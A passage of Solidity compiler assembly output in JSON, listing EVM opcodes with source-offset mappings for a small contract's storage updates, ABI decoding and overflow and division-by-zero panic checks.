											"begin": 603,
											"end": 620,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 603,
											"end": 620,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 603,
											"end": 620,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 603,
											"end": 620,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 603,
											"end": 620,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 635,
											"end": 639,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 628,
											"end": 639,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 639,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 628,
											"end": 639,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 575,
											"end": 706,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 575,
											"end": 706,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 678,
											"end": 679,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 660,
											"end": 675,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 660,
											"end": 679,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 660,
											"end": 679,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 660,
											"end": 679,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 660,
											"end": 679,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 694,
											"end": 699,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 687,
											"end": 699,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 687,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 687,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 687,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 687,
											"end": 699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 710,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 80,
											"end": 110,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 80,
											"end": 110,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 7,
											"end": 140,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 94,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 75,
											"end": 95,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 66,
											"end": 95,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 66,
											"end": 95,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 128,
											"end": 133,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 146,
											"end": 402,
											"name": "tag",
											"source": 2,
											"value": "7"
										},
										{
											"begin": 146,
											"end": 402,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 146,
											"end": 402,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 253,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 239,
											"end": 248,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 230,
											"end": 237,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 226,
											"end": 249,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 222,
											"end": 254,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 219,
											"end": 221,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 219,
											"end": 221,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 221,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 267,
											"end": 268,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 264,
											"end": 265,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 257,
											"end": 269,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 219,
											"end": 221,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 221,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 310,
											"end": 311,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 377,
											"end": 384,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 368,
											"end": 374,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 357,
											"end": 366,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 353,
											"end": 375,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 335,
											"end": 385,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 325,
											"end": 385,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 325,
											"end": 385,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 281,
											"end": 395,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 408,
											"end": 517,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 408,
											"end": 517,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 489,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 504,
											"end": 509,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 489,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 484,
											"end": 487,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 477,
											"end": 511,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 467,
											"end": 517,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 467,
											"end": 517,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 467,
											"end": 517,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 523,
											"end": 641,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 523,
											"end": 641,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 610,
											"end": 634,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 628,
											"end": 633,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 610,
											"end": 634,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "tag",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 605,
											"end": 608,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 598,
											"end": 635,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 588,
											"end": 641,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 588,
											"end": 641,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 588,
											"end": 641,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 647,
											"end": 857,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 647,
											"end": 857,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 647,
											"end": 857,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 772,
											"end": 774,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 761,
											"end": 770,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 757,
											"end": 775,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 749,
											"end": 775,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 749,
											"end": 775,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 785,
											"end": 850,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 847,
											"end": 848,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 836,
											"end": 845,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 832,
											"end": 849,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 823,
											"end": 829,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 785,
											"end": 850,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "tag",
											"source": 2,
											"value": "14"
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 994,
											"end": 996,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 983,
											"end": 992,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 979,
											"end": 997,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 971,
											"end": 997,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 971,
											"end": 997,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1075,
											"end": 1076,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1064,
											"end": 1073,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1060,
											"end": 1077,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1051,
											"end": 1057,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 1166,
											"end": 1167,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "tag",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1143,
											"end": 1168,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1143,
											"end": 1168,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1200,
											"end": 1201,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1177,
											"end": 1202,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1177,
											"end": 1202,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1221,
											"end": 1222,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "tag",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1268,
											"end": 1269,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1265,
											"end": 1266,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1261,
											"end": 1270,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 1256,
											"end": 1270,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1256,
											"end": 1270,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "tag",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1360,
											"end": 1361,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1337,
											"end": 1362,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1337,
											"end": 1362,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1394,
											"end": 1395,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "tag",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1371,
											"end": 1396,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1371,
											"end": 1396,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1415,
											"end": 1416,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1412,
											"end": 1413,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1409,
											"end": 1417,
											"name": "LT",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "tag",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "tag",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1465,
											"end": 1466,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1462,
											"end": 1463,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1458,
											"end": 1467,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 1450,
											"end": 1467,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1450,
											"end": 1467,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "tag",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1556,
											"end": 1561,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1549,
											"end": 1562,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1542,
											"end": 1563,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1563,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1563,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1641,
											"end": 1646,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1630,
											"end": 1646,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1630,
											"end": 1646,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1738,
											"end": 1743,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "tag",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1711,
											"end": 1744,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1711,
											"end": 1744,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1766,
											"end": 1832,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1759,
											"end": 1764,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1756,
											"end": 1833,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "tag",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1883,
											"end": 1884,
											"name": "PUSH",
											"source": 2,
											"value": "1"
										},
										{
											"begin": 1876,
											"end": 1881,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1872,
											"end": 1885,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1865,
											"end": 1885,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1865,
											"end": 1885,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1897,
											"end": 2077,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1897,
											"end": 2077,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1945,
											"end": 2022,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1942,
											"end": 1943,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1935,
											"end": 2023,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2042,
											"end": 2046,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 2039,
											"end": 2040,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2032,
											"end": 2047,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2070,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2063,
											"end": 2064,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2056,
											"end": 2071,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2083,
											"end": 2263,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 2083,
											"end": 2263,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2131,
											"end": 2208,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2128,
											"end": 2129,
